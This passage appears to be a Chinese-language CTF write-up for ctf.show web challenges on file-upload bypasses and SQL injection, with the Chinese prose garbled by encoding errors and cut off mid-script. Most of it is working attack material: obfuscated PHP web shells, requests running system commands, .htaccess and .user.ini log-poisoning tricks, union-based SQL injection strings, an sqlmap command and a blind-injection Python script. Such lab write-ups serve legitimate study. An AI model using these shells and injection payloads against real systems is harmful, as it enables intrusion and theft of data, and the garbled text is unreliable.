<span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>å…ˆéšä¾¿æˆªä¸ªå›¾ç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨åä¸‹è½½ä¸‹æ¥ã€‚</p></li><li><p>å°†ä¸‹è½½ä¸‹æ¥çš„å›¾ç‰‡æ”¾åˆ°è„šæœ¬ç›®å½•ä¸‹ï¼Œè¿è¡Œ&#96; php jpg_payload.php download.jpg </p></li><li><p>ä½¿ç”¨èšå‰‘é“¾æ¥æˆ–è€…ä½¿ç”¨bp</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php?image=8ef28ae0fc43a1cb9d73b76784b5fd02.jpg</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>900b6ebe-ba3e-486d-9e2d-ffd2c0fa6729.challenge.ctf.show</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://900b6ebe-ba3e-486d-9e2d-ffd2c0fa6729.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">7</span>=system(<span class="string">&#x27;cat f*&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><h4><span id="web166">web166</span></h4><p>å¦‚æœä¸Šä¼ ä¸äº†ï¼ŒæŠŠContent-Typeè®¾ç½®ä¸€ä¸‹<code>Content-Type: application/x-zip-compressed</code></p><h4><span id="web167">web167</span></h4><ul><li>è€ƒç‚¹ï¼šApacheçš„åŒ…å«è§£æ</li></ul><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .jpg </span><br></pre></td></tr></table></figure><h4><span id="web-168">web 168</span></h4><p>ä½¿ç”¨&#96;&#96;ç»•è¿‡</p><ol><li>ä¸Šä¼ pngå›¾ç‰‡ï¼Œé€šè¿‡bpå°†åç¼€æ”¹æˆ<code>1.php</code>ï¼Œç„¶åç»“å°¾åŠ ä¸Š<code>&lt;?=`tac ../f*`?&gt;</code></li><li>è®¿é—®xxx&#x2F;upload&#x2F;1.phpå³å¯</li></ol><p>ä¸Šä¼ phpæ–‡ä»¶å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="web169">web169</span></h4><p>æŸ¥çœ‹å‰ç«¯æºä»£ç ï¼Œè¿™é“é¢˜å‰ç«¯è®©æˆ‘ä»¬ä¼ zipï¼Œç„¶ååœ¨bpé‡Œé¢æ”¹æˆimage&#x2F;pngå› ä¸ºåç«¯åªæ¥å—pngå›¾ç‰‡ï¼Œç„¶åå’Œå‰é¢uaç»•è¿‡çš„æ–¹å¼ä¸€æ ·ï¼Œé€šè¿‡<code>.user.ini</code>æ–‡ä»¶åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åè®¿é—®&#x2F;upload&#x2F;è·¯å¾„ï¼Œä½†æ˜¯å‘ç°404.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>225</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?=eval($_POST[1]);?&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMmAfVSTikIwEpnAY</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file=/var/<span class="keyword">log</span>/nginx/<span class="keyword">access</span>.<span class="keyword">log</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œå†…å®¹è°ä¾¿å¡«å†™å³å¯ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>185</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?=eval($_POST[1]);?&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMmAfVSTikIwEpnAY</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;index.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">123</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><h3><span id="sql-æ³¨å…¥">SQL æ³¨å…¥</span></h3><p><strong>çŸ¥è¯†ç‚¹</strong></p><ul><li><code>%23 </code>ç›¸å½“äº # å¯ä»¥æ³¨é‡Šåé¢çš„è¯­å¥ï¼ŒåŒç†<code> --+</code>ä¹Ÿä»£è¡¨æ³¨é‡Š</li></ul><p><strong>sqlmap</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://789aa550-e618-4859-a737-146010bc76ee.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;python sqlmap.py -u &quot;<span class="subst">&#123;url&#125;</span>api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;<span class="subst">&#123;url&#125;</span>api/getToken.php&quot; --safe-freq=1 --tamper=web210.py --tables&#x27;</span></span><br><span class="line"></span><br><span class="line">payload</span><br></pre></td></tr></table></figure><h4><span id="web171">web171</span></h4><p>æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥æ•°æ®åº“åï¼š</p><ul><li>-1 æ˜¯ä¸ºäº†æŸ¥è¯¢ä¸åœ¨è¡¨ä¸­çš„æ•°æ®ï¼Œä½¿å¾—åªæ˜¾ç¤ºæˆ‘ä»¬éœ€è¦çš„æ•°æ®</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;u</span>nion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() --+</span><br></pre></td></tr></table></figure><p>æŸ¥è¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow_web&quot; --+</span></span><br></pre></td></tr></table></figure><p>æŸ¥åˆ—åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_user&quot; --+</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;u</span>nion <span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user --+</span><br></pre></td></tr></table></figure><h4><span id="web172">web172</span></h4><p>ç”¨æˆ·åæ˜¯flagåˆ™ä¸ç»™è¾“å‡º</p><ul><li><p>æ–¹æ³•ä¸€ï¼šç›´æ¥ä½¿ç”¨å…¶ä»–å­—æ®µä»£æ›¿username</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username =&#x27;</span>flag<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,password <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username =&#x27;</span>flag</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨to_base64ã€hexç­‰ç­‰æ–¹æ³•åŠ å¯†username</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select to_base64(username),password from ctfshow_user2  --+</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web174">web174</span></h4><ul><li><p>æ–¹æ³•ä¸€ï¼šæ›¿æ¢</p><p>è¿”å›é€»è¾‘åˆ¤æ–­äº†ä¸èƒ½åŒ…å«æ•°å­—å’Œflagï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆbase64ç¼–ç ï¼Œå†å¯¹æ•°å­—è¿›è¡Œæ›¿æ¢ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;) from ctfshow_user4 where username=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹çˆ†å‡ºçš„å­—ç¬¦ä¸²åå‘æ›¿æ¢ä»¥ä¸‹å°±è¡Œäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;YnumCRmcnumBhvdnumCsnumCOTknumEMDdkNynumAhMWIxLTRiYzQtOTEnumJYinumJnumCMWJiZTBlNjFhZTRnumI&quot;</span></span><br><span class="line">flag=flagstr.replace(<span class="string">&#x27;numA&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;numB&#x27;</span>,<span class="string">&#x27;2&#x27;</span>).replace(<span class="string">&#x27;numC&#x27;</span>,<span class="string">&#x27;3&#x27;</span>).replace(<span class="string">&#x27;numD&#x27;</span>,<span class="string">&#x27;4&#x27;</span>).replace(<span class="string">&#x27;numE&#x27;</span>,<span class="string">&#x27;5&#x27;</span>).replace(<span class="string">&#x27;numF&#x27;</span>,<span class="string">&#x27;6&#x27;</span>).replace(<span class="string">&#x27;numG&#x27;</span>,<span class="string">&#x27;7&#x27;</span>).replace(<span class="string">&#x27;numH&#x27;</span>,<span class="string">&#x27;8&#x27;</span>).replace(<span class="string">&#x27;numI&#x27;</span>,<span class="string">&#x27;9&#x27;</span>).replace(<span class="string">&#x27;numJ&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨å…¶ä»–ç¬¦å·ä»£æ›¿</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;)&#x27;</span>),<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;(&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;*&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;^&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;%&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;$&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;#&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;@&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"># &quot;a1b2c3d4e5&quot; <span class="operator">=</span><span class="operator">&gt;</span> &quot;a!b@c3d4e5&quot;</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šç›²æ³¨</p><blockquote><p>flagæ ¼å¼ctfshow{xxxxxxxx(8)-xxxx(4)-xxxx(4)-xxxx(4)-xxxxxxxxxxxx(12)}<br>å…¶ä¸­æ¯ä¸ª x æ˜¯ 0-9 æˆ– a-f èŒƒå›´å†…çš„ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—ã€‚</p></blockquote><p>ä»£ç ä¸­ä½¿ç”¨æ³¨é‡Šâ€œ&#x2F;**&#x2F;â€å°†ç©ºæ ¼æ›¿æ¢æ‰ï¼Œä»¥é¿å…URLç¼–ç å¯èƒ½å¯¼è‡´çš„é—®é¢˜ã€‚</p><ul><li><p>å¸ƒå°”ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show//api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid=string.ascii_lowercase+<span class="string">&quot;-&#125;&#123;&quot;</span>+string.digits</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:    </span><br><span class="line">        payload = <span class="string">&quot;and ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;) from &#123;0&#125; for 1))=&#123;1&#125;--%20&amp;page=1&amp;limit=10&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>).<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>trimç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span 